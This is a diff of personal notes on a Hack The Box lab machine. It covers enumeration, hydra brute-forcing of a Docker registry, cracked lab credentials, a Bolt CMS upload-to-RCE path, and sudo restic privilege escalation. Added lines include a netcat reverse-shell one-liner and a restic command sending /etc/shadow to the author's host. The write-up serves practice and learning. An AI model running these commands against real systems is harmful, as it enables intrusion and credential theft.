@@ -12,8 +12,9 @@
 * Still no trace of a login page (If it's necessary anyway).
 * gobuster dir -u http://10.10.10.159/install -x .php,.txt,.html,.md -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
  -b 403,404  
-
- gobuster dns -d registry.htb -w ./test.wordlist  
+  ```
+  gobuster dns -d registry.htb -w ./test.wordlist  
+  ```
 
  * Version of bolt I found is 3.6.4 .  
  * Seems that bolt is coded with php.  
@@ -40,21 +41,21 @@
 
 * Finally I got something  
 * I got this through requesting `/v2` but I need to find an endpoint I guess.  
-```uri
-HTTP/1.1 401 Unauthorized
+  ```uri
+  HTTP/1.1 401 Unauthorized
 
-Server: nginx/1.14.0 (Ubuntu
-Date: Fri, 11 Feb 2022 09:32:27 GMT
-Content-Type: application/json; charset=utf-8
-Content-Length: 87
-Connection: close
-Docker-Distribution-Api-Version: registry/2.0
-Www-Authenticate: Basic realm="Registry"
-X-Content-Type-Options: nosniff
+  Server: nginx/1.14.0 (Ubuntu
+  Date: Fri, 11 Feb 2022 09:32:27 GMT
+  Content-Type: application/json; charset=utf-8
+  Content-Length: 87
+  Connection: close
+  Docker-Distribution-Api-Version: registry/2.0
+  Www-Authenticate: Basic realm="Registry"
+  X-Content-Type-Options: nosniff
 
 
-{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
-```  
+  {"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
+  ```  
 
 * That's what I found by researching  
   <blockquote>
@@ -67,32 +68,32 @@ X-Content-Type-Options: nosniff
   A protection space is defined by the canonical root URI (the scheme and authority components of the effective request URI) of the server being accessed, in combination with the realm value if present. These realms allow the protected resources on a server to be partitioned into a set of protection spaces, each with its own authentication scheme and/or authorization database. The realm value is a string, generally assigned by the origin server, that can have additional semantics specific to the authentication scheme. Note that a response can have multiple challenges with the same auth-scheme but with different realms.
   </blockquote>  
 
-```
-  hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst docker.registry.htb -s 443 https-get /v2/
-```  
+  ```
+    hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst docker.registry.htb -s 443 https-get /v2/
+  ```  
 
 * I GOT ACCESS. I brute forced the authentication of the docker registry and found a password "admin:admin" on the http service not the https.  
 * Found a passphrase for bolt ssh login "GkOcz221Ftb3ugog".
 * Uncommon setuid binary `/sbin/mount.cifs`.  
 * Backups no OS  
-```console
-/var/www/html/bolt/vendor/codeception/codeception/tests/data/included/jazz/tests/_data/dump.sql
-/var/www/html/bolt/vendor/codeception/codeception/tests/data/included/jazz/pianist/tests/_data/dump.sql
-/var/www/html/bolt/vendor/codeception/codeception/tests/data/included/shire/tests/_data/dump.sql
-/var/www/html/bolt/vendor/codeception/codeception/tests/data/dump.sql
-/var/www/html/bolt/vendor/codeception/codeception/tests/data/claypit/tests/_data/dump.sql
-
-```  
+  ```console
+  /var/www/html/bolt/vendor/codeception/codeception/tests/data/included/jazz/tests/_data/dump.sql
+  /var/www/html/bolt/vendor/codeception/codeception/tests/data/included/jazz/pianist/tests/_data/dump.sql
+  /var/www/html/bolt/vendor/codeception/codeception/tests/data/included/shire/tests/_data/dump.sql
+  /var/www/html/bolt/vendor/codeception/codeception/tests/data/dump.sql
+  /var/www/html/bolt/vendor/codeception/codeception/tests/data/claypit/tests/_data/dump.sql
+  ```  
 
 * `Feb10     1754     root registry serve /etc/docker/registry/config.yml`
 
 * Seems interesting `Feb10     1726     root /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.18.0.2 -container-port 5000`  
 
-```
-GET /v2/_catalog HTTP/1.1
-Host: 172.18.0.2:5000
-Authorization: Basic YWRtaW46YWRtaW4=
-```  
+  ```
+  GET /v2/_catalog HTTP/1.1
+  Host: 172.18.0.2:5000
+  Authorization: Basic YWRtaW46YWRtaW4=
+  ```  
+
 * There's no docker group and I can't create one
 * I can't see if I have sudo privilege because I don't know what's my user's password.
 
@@ -105,36 +106,32 @@ Authorization: Basic YWRtaW46YWRtaW4=
   * The `runc` command but there's nothing from its side either.
   * There's also the `registry serve /etc/docker/registry/config.yml` command that neither the command exists nor the file in the path exists.  
 
-nc -l -p 1234 > mysql
-
-nc -w 3 10.10.10.159 1234 < mysql  
-
 * This could be something `/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request`.  
 * Use SUID3NUM it's nice. Relieves the burden of searching through the SUID binaries and checking if it's normal that they have the sticky bit or not. ( And it's legit in OSCP)  
 
-* SOMETHING!!!  
 
-```console
-CREATE TABLE bolt_authtoken (
-  id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, 
-  user_id INTEGER DEFAULT NULL, 
-  username VARCHAR(32) DEFAULT NULL, 
-  token VARCHAR(128) NOT NULL, 
-  salt VARCHAR(128) NOT NULL, 
-  lastseen DATETIME DEFAULT NULL, 
-  ip VARCHAR(45) DEFAULT NULL, 
-  useragent VARCHAR(128) DEFAULT NULL, 
-  validity DATETIME DEFAULT NULL)
-1, 
-1, 
-None, 
-a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953cb65cba2, 
-f8e7da1a2b9ea7109e0bdeedb6e85135, 
-2019-10-08 21:25:07, 
-192.168.1.52, 
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36, 
-2019-10-22 21:25:07
-```  
+* Database table I found in the linpeas scan  
+  ```console
+  CREATE TABLE bolt_authtoken (
+    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, 
+    user_id INTEGER DEFAULT NULL, 
+    username VARCHAR(32) DEFAULT NULL, 
+    token VARCHAR(128) NOT NULL, 
+    salt VARCHAR(128) NOT NULL, 
+    lastseen DATETIME DEFAULT NULL, 
+    ip VARCHAR(45) DEFAULT NULL, 
+    useragent VARCHAR(128) DEFAULT NULL, 
+    validity DATETIME DEFAULT NULL)
+  1, 
+  1, 
+  None, 
+  a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953cb65cba2, 
+  f8e7da1a2b9ea7109e0bdeedb6e85135, 
+  2019-10-08 21:25:07, 
+  192.168.1.52, 
+  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36, 
+  2019-10-22 21:25:07
+  ```  
 
 <blockquote>
 The bolt_authtoken cookie is used to store a token for your identification in the bolt admin interface after you logged in (if you remove it you will be logged out).
@@ -142,9 +139,70 @@ The bolt_authtoken cookie is used to store a token for your identification in th
 
 Cookie: bolt_authtoken=a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953cb65cba2
 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 1234 >/tmp/f
+
+
+* Found this commit   
+  ```
+  commit 42af4fd3a178de245cf11aced78d7354fde2e246
+  Author: ToBe998 <tobe@topolis.de>
+  Date:   Wed Sep 12 22:17:25 2018 +0200
+
+      Added method to login as specific user without password (#7664)
+      
+      * Added method to login as specific user without pasword
+      
+      As discussed on Slack, the added `loinAsUser()` method enabled extension crea
+  tors to override the login mechanics and connect bolt to various kinds of SSO sys
+  tems. Since the logic for user management and authentication is currently (pre 4.
+  1) not centralized enough, a lot of needed code would have to be duplicated to ar
+  chive this. (And we certainly dont want to go there ;) )
+      
+      PS: The file is identical to 3.5 and could also be backported?
+      
+      I can provide guides on how to do this if needed.
+      
+      * phpdoc updated
+      
+      * Update Login.php
+      
+      * code reviews
+      
+      * Update Login.php
+      
+      * Update Login.php
+
+  ```  
+
+* I found the login page.
+* Turns out the profiler is the key.
+
+* FOUND PASSWORD `$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry`  
+
+  ```
+  sudo restic backup -r "rest:http://10.10.14.18:1234/ABCDEFU" "/etc/shadow"
+  ./rest-server --listen ":12345"
+  restic init -r "rest:http://127.0.0.1/bolt"
+  restic init -r "rest:http://localhost:$RPORT/$NAME"
+  /tmp/rest-server --listen ":5555" --no-auth
+  restic -r /tmp/restShit restore c0075dc5 --target /tmp/restOut
+  restic backup -r restShit restore c0075dc5 --target /tmp/restOut 
+  ```  
+
+* web server `DocumentRoot /var/www/html`
+
 
 ## <span style="color:#9933FF">How Did I Solve the Machine 😎🥳 
 
+1. Did some useless and insane BFing.
+2. Domain of the SSL certificate was the answer which led to me finding out that the domain `docker.registry.htb` is a docker registry and that I can access a docker image saved in the repositories of it which led me to gain access to bolt's ssh private key and its passphrase.  
+3. After getting into the system as bolt I kept enumerating and cursing this damn machien until I found a file that had some kind of log of the urls that have been visited and found the login page through that.
+4. Then brute forced the password of the admin that I found in the linPEAS scan in one of the database files and logged in bolt with.
+5. Now, what's left is to upload a rev shell to get rce as www-data.
+6. So I uploaded the file in the folder with the frontend stuff because the root has a cron that deletes the files in the folder files each minute I think.
+7. I had to add `.php` in the list of allowed extensions in the config.yml file.
+8. Then upload the reverse shell which gave me a hard time because I couldn't connect to my box so I had to listen on the victim itself.
+9. As soon as I was www-data I was able to use the ability of www-data to `sudo restic` with the `rest http` method so that the files won't be backed up with the privileges they are in right now.
 
 <br/><br/>
 
@@ -152,13 +210,26 @@ Cookie: bolt_authtoken=a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953c
 
 ## <span style="color:#9933FF">Where I Got Stuck?😡😧  
 
-
+* In a lot of places  
+* I didn't look into the ssl certificate the right way so I got stuck on trying to gain foothold on the system.
+* Then I really relied on linPEAS and the other enumeration tools when they proved to sometimes be not very helpful and that I have to do an enumeration of my own.
+* Then I used the `restic` command the wrong way which led to me backing up the root's files with root privilege but then I used it the correct way and got root and then read the contents of the SSH file.  
 <br/><br/>
 
 
 
 ## <span style="color:#9933FF">What Did I learn from this Machine?👀  
 
+### <span style="color:#9933FF"> Weak Credentials
+* The password for the docker registry was admin/admin.  
+* Also, the password for the bolt account was easily crackable "strawberry". Is it true that the harder the password is the harder it is to crack it's hash? I mean it makes sense because when we thing about it if the password is hard it might not be in a wordlist at all. Which means we can't crack it.
+
+### <span style="color:#9933FF"> Old Software  
+* The bolt version was not up to date which led to me exploiting a file upload vulnerability in that version.  
+
+### <span style="color:#9933FF"> The Ability to Download php files  
+* Also, maybe the fact that the admin was able to edit the config.yml file, which gave the ability to manipulate allowed file extensions.  
+* Maybe the fact that the extension checking only relied on the configuration file. I think even if the admin can choose whatever extensions they want some extensions should always be restricted like the `.php` extension as an example.
 
 <br/><br/>
 
@@ -166,304 +237,43 @@ Cookie: bolt_authtoken=a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953c
 
 ## <span style="color:#9933FF">Writeups ✍🏽📓   
 
+### Ippsec's Walkthrough  
+* If I did the aggressive nmap scan on the https port I get the ssl certificate which gives me the information I need for the subdomain of the virtual host. There also could be the date when the certificate was created.  
+* For the domain of the IP he put `docker.registry.htb` and `registry.htb` in the `/etc/hosts` file in case both are needed  
+  ```console
+  10.10.10.159  docker.registry.htb registry.htb
+  ```  
+* It's always good to look at the SSL certificate info.  
+* He `curl -vvv http://url` and compared it with the `curl -vvv -k https://url` he compared the outputs to see if there's a difference in the headers.
+* He uses "FoxyProxy".
+* We can list repositories in Docker Registry by going to `http://docker.registry.htb/v2/_catalog`.
+* He used `docker.io` package to go through the bolt-image instead of just looking in the folders.
+* We just need to login with `docker login docker.registry.htb` but it gave an error that the "certificate signed by unknown authority". To fix that he added the certificate. How? It's in the install zip file that he installed so he copied it to `/etc/docker/certs.d/docker.registry.htb`.  
+* `docker run -it docker.registry.htb/bolt-image sh` to get a shell on our local system but it's running the docker image.   
+* We can notice the dates the files and certificates and really anything was created and then try and search with this command `find / -type -newermt "2019-05-05" ! -newermt "2019-05-26" -ls 2>/dev/null | grep -v ' /var/'` for the stuff that was modified in a specific range of dates. He also put the ` /var/` in the command because as said by him var isn't really interesting right away.  
+
+* All SSH keys should have a privilege of 600.  
+
+* We can create a file in the `.ssh` in my home as an attacker called "config" which can help me with sshing to hosts by providing some info on how to ssh to that specific host like the following  
+  ```console
+  Host  [ANY NAME]
+          HostName 10.10.10.159
+          User bolt
+          IdentityFile /path/to/ssh/key
+  ```  
+
+* The file `.viminfo` could give me some more information (If it did not have the size of zero).  
+
+* The first thing he did when he gained foothold is the command `ip addr` to see if we're on the machine itself or in anothe docker container.  
+
+* He opened any `.db` file by `wget`ting the file to his box and then he used sqlite there.
+* He first copied the files he wanted to be downloaded on his box to `/dev/shm`.
+* The problem with the thing that I can't connect to a reverse shell or basically anything from my box is that there's a rule in the IP table that prevents the three way handshake from happening outbound. It's something like this `-A OUTPUT -d 10.0.0.0/8 -p tcp -m tcp --tcp-flags FIN,SYNRST,ACK SYN -j DROP`.  
+
+* The `-r` option in the the restic command means "recursive". 
 
 <br/><br/>
-* feroxbuster's results  
-```
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git => http://10.10.10.159/bolt/.git/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app => http://10.10.10.159/bolt/app/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/branches => http://10.10.10.159/bolt/.git/branches/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/branches/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/branches/.htpasswd
-200      GET       11l       29w      251c http://10.10.10.159/bolt/.git/config
-200      GET        1l       10w       73c http://10.10.10.159/bolt/.git/description
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache => http://10.10.10.159/bolt/app/cache/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/cache/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/cache/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/extensions => http://10.10.10.159/bolt/extensions/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/extensions/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/extensions/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/files => http://10.10.10.159/bolt/files/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/config => http://10.10.10.159/bolt/app/config/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/files/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/files/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/config/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/config/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/database => http://10.10.10.159/bolt/app/database/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/database/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/database/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/hooks => http://10.10.10.159/bolt/.git/hooks/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/hooks/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/hooks/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/info => http://10.10.10.159/bolt/.git/info/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/info/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/info/.htaccess
-200      GET      735l     3068w   282698c http://10.10.10.159/bolt/.git/index
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/logs => http://10.10.10.159/bolt/.git/logs/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/logs/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/logs/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/development => http://10.10.10.159/bolt/app/cache/development/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/cache/development/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/cache/development/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/objects => http://10.10.10.159/bolt/.git/objects/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/objects/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/objects/.htaccess
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/config/extensions => http://10.10.10.159/bolt/app/config/extensions/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/config/extensions/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/config/extensions/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/refs => http://10.10.10.159/bolt/.git/refs/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/refs/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/refs/.htaccess
-200      GET        6l       43w      240c http://10.10.10.159/bolt/.git/info/exclude
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src => http://10.10.10.159/bolt/src/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/src/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/src/.htaccess
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/resources => http://10.10.10.159/bolt/app/resources/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/resources/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/resources/.htaccess
-301      GET        7l       13w      194c http://10.10.10.159/bolt/tests => http://10.10.10.159/bolt/tests/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Events => http://10.10.10.159/bolt/src/Events/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/tests/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/tests/.htaccess
-301      GET        7l       13w      194c http://10.10.10.159/bolt/src/Security => http://10.10.10.159/bolt/src/Security/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/src/Events/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/theme => http://10.10.10.159/bolt/theme/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/theme/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/theme/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/src/Security/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/development/data => http://10.10.10.159/bolt/app/cache/development/data/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor => http://10.10.10.159/bolt/vendor/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/src => http://10.10.10.159/bolt/app/src/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/src/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/src/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler => http://10.10.10.159/bolt/app/cache/profiler/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/00 => http://10.10.10.159/bolt/app/cache/profiler/00/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/cache/profiler/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/cache/profiler/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/01 => http://10.10.10.159/bolt/app/cache/profiler/01/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/05 => http://10.10.10.159/bolt/app/cache/profiler/05/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/11 => http://10.10.10.159/bolt/app/cache/profiler/11/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/08 => http://10.10.10.159/bolt/app/cache/profiler/08/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/12 => http://10.10.10.159/bolt/app/cache/profiler/12/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/15 => http://10.10.10.159/bolt/app/cache/profiler/15/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/1c => http://10.10.10.159/bolt/app/cache/profiler/1c/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/22 => http://10.10.10.159/bolt/app/cache/profiler/22/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/29 => http://10.10.10.159/bolt/app/cache/profiler/29/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/2d => http://10.10.10.159/bolt/app/cache/profiler/2d/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/39 => http://10.10.10.159/bolt/app/cache/profiler/39/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/3d => http://10.10.10.159/bolt/app/cache/profiler/3d/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/45 => http://10.10.10.159/bolt/app/cache/profiler/45/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view => http://10.10.10.159/bolt/app/view/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/52 => http://10.10.10.159/bolt/app/cache/profiler/52/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/65 => http://10.10.10.159/bolt/app/cache/profiler/65/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/66 => http://10.10.10.159/bolt/app/cache/profiler/66/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/view/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/view/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/67 => http://10.10.10.159/bolt/app/cache/profiler/67/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/74 => http://10.10.10.159/bolt/app/cache/profiler/74/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/75 => http://10.10.10.159/bolt/app/cache/profiler/75/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/77 => http://10.10.10.159/bolt/app/cache/profiler/77/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/79 => http://10.10.10.159/bolt/app/cache/profiler/79/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/82 => http://10.10.10.159/bolt/app/cache/profiler/82/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/86 => http://10.10.10.159/bolt/app/cache/profiler/86/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/87 => http://10.10.10.159/bolt/app/cache/profiler/87/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/89 => http://10.10.10.159/bolt/app/cache/profiler/89/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/90 => http://10.10.10.159/bolt/app/cache/profiler/90/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/93 => http://10.10.10.159/bolt/app/cache/profiler/93/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/98 => http://10.10.10.159/bolt/app/cache/profiler/98/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/95 => http://10.10.10.159/bolt/app/cache/profiler/95/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/91 => http://10.10.10.159/bolt/app/cache/profiler/91/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/a5 => http://10.10.10.159/bolt/app/cache/profiler/a5/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/aa => http://10.10.10.159/bolt/app/cache/profiler/aa/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/a4 => http://10.10.10.159/bolt/app/cache/profiler/a4/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/ab => http://10.10.10.159/bolt/app/cache/profiler/ab/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/bin => http://10.10.10.159/bolt/vendor/bin/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/objects/info => http://10.10.10.159/bolt/.git/objects/info/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/bin/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/bin/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/objects/info/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/objects/info/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/b2 => http://10.10.10.159/bolt/app/cache/profiler/b2/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/refs/heads => http://10.10.10.159/bolt/.git/refs/heads/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/b7 => http://10.10.10.159/bolt/app/cache/profiler/b7/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/b3 => http://10.10.10.159/bolt/app/cache/profiler/b3/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/refs/heads/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/refs/heads/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/bc => http://10.10.10.159/bolt/app/cache/profiler/bc/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/bd => http://10.10.10.159/bolt/app/cache/profiler/bd/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/composer => http://10.10.10.159/bolt/vendor/composer/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/bb => http://10.10.10.159/bolt/app/cache/profiler/bb/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/composer/.htaccess
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/contao => http://10.10.10.159/bolt/vendor/contao/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/c2 => http://10.10.10.159/bolt/app/cache/profiler/c2/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/ca => http://10.10.10.159/bolt/app/cache/profiler/ca/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/trans => http://10.10.10.159/bolt/app/cache/trans/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/c4 => http://10.10.10.159/bolt/app/cache/profiler/c4/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/c3 => http://10.10.10.159/bolt/app/cache/profiler/c3/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/cache/trans/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/cache/trans/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/cc => http://10.10.10.159/bolt/app/cache/profiler/cc/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/cd => http://10.10.10.159/bolt/app/cache/profiler/cd/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/cf => http://10.10.10.159/bolt/app/cache/profiler/cf/
-200      GET       21l      168w     1070c http://10.10.10.159/bolt/vendor/composer/LICENSE
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/logs/refs => http://10.10.10.159/bolt/.git/logs/refs/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/logs/refs/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/logs/refs/.htaccess
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/embed => http://10.10.10.159/bolt/vendor/embed/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/.git/objects/pack => http://10.10.10.159/bolt/.git/objects/pack/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/objects/pack/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/.git/objects/pack/.htpasswd
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/embed/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/embed/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/d1 => http://10.10.10.159/bolt/app/cache/profiler/d1/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/d2 => http://10.10.10.159/bolt/app/cache/profiler/d2/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/vendor/facebook => http://10.10.10.159/bolt/vendor/facebook/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/facebook/.htaccess
-403      GET        7l       11w      178c http://10.10.10.159/bolt/vendor/facebook/.htpasswd
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/de => http://10.10.10.159/bolt/app/cache/profiler/de/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/cache/profiler/df => http://10.10.10.159/bolt/app/cache/profiler/df/
-301      GET        7l       13w      194c http://10.10.10.159/bolt/app/view/css => http://10.10.10.159/bolt/app/view/css/
-403      GET        7l       11w      178c http://10.10.10.159/bolt/app/view/css/.htaccess
